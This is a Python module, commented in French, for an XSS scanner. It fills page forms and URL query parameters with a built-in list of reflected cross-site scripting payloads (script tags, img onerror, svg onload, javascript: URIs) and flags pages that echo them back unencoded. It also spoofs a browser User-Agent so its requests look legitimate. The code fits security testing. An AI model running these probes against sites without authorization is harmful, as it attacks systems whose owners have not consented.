#!/usr/bin/env python3
# coding:utf-8
import urllib.parse
import html
import requests
from bs4 import BeautifulSoup
from dataclasses import dataclass, field
from typing import List
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

@dataclass
class XSSResult:
    vulnerable: bool = False
    findings: List[dict] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

    def add_finding(self, type_, url, param, payload):
        self.vulnerable = True
        self.findings.append({
            "vuln_type": "XSS",
            "type": type_,
            "url": url,
            "param": param,
            "payload": payload
        })

    def summary(self):
        res_str = ""
        for f in self.findings:
            res_str += f"[X] XSS ({f['type']}) dans '{f['param']}': {f['url']}\n"
        return res_str

class XSSModule:
    DEFAULT_PAYLOADS = [
        "<script>alert('XSS')</script>",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        '"><img src=x onerror=alert(1)>',
        "';alert(1)//",
    ]

    @staticmethod
    def create_session():
        session = requests.Session()
        # Retry automatique sur erreurs réseau
        retry = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        # Headers pour paraître légitime
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        })
        return session

    @staticmethod
    def _is_vulnerable(response_text, payload):
        """
        Vérifie si le payload est reflété sans encodage
        """
        # Le payload brut est présent (non encodé)
        if payload in response_text:
            return True
        # Vérifier aussi les variantes partiellement encodées
        decoded = html.unescape(response_text)
        if payload in decoded:
            return True
        return False

    @staticmethod
    def _extract_form_params(form, payload):
        """
        Extrait tous les champs du formulaire (input, textarea, select)
        """
        params = {}
        # Inputs classiques
        for input_ in form.find_all("input"):
            name = input_.get("name")
            if not name:
                continue
            input_type = input_.get("type", "text").lower()
            if input_type in ["text", "password", "email", "search", "url"]:
                params[name] = payload
            elif input_type == "hidden":
                params[name] = input_.get("value", "")
            elif input_type in ["submit", "button"]:
                params[name] = input_.get("value", "submit")

        # Textareas
        for textarea in form.find_all("textarea"):
            name = textarea.get("name")
            if name:
                params[name] = payload

        # Selects — prendre la première option disponible
        for select in form.find_all("select"):
            name = select.get("name")
            if not name:
                continue
            option = select.find("option")
            params[name] = option.get("value", "") if option else ""

        return params

    @staticmethod
    def check_form(session, page_url, page_source, payloads=None):
        if page_source is None:
            return XSSResult()

        if payloads is None:
            payloads = XSSModule.DEFAULT_PAYLOADS
            
        result = XSSResult()
        soup = BeautifulSoup(page_source, "html.parser")
        forms = soup.find_all("form")
        
        for form in forms:
            form_action = form.get("action", "")
            form_method = form.get("method", "GET").upper()
            target_url = urllib.parse.urljoin(page_url, form_action)
            
            for payload in payloads:
                params = XSSModule._extract_form_params(form, payload)
                try:
                    if form_method == "GET":
                        res = session.get(target_url, params=params, timeout=10)
                    else:
                        res = session.post(target_url, data=params, timeout=10)
                    
                    if XSSModule._is_vulnerable(res.text, payload):
                        # On identifie quel paramètre est vulnérable (approximatif ici car on injecte partout)
                        result.add_finding("FORM", target_url, "Multiple/Form", payload)
                        break # Passer au formulaire suivant après détection
                except Exception as e:
                    result.errors.append(f"Erreur formulaire sur {target_url}: {e}")
        
        return result

    @staticmethod
    def check_link(session, page_url, payloads=None):
        if "=" not in page_url:
            return XSSResult()
        
        if payloads is None:
            payloads = XSSModule.DEFAULT_PAYLOADS
        
        result = XSSResult()
        parsed = urllib.parse.urlparse(page_url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        for key in params:
            original_values = params[key]
            for payload in payloads:
                test_params = dict(params)
                test_params[key] = [payload] # parse_qs values are lists
                
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()

                try:
                    res = session.get(test_url, timeout=10)
                    if XSSModule._is_vulnerable(res.text, payload):
                        result.add_finding("URL", test_url, key, payload)
                        break  # passer au paramètre suivant
                except Exception as e:
                    result.errors.append(f"Erreur sur {test_url}: {e}")
                    continue
            
            params[key] = original_values  # restaurer

        return result
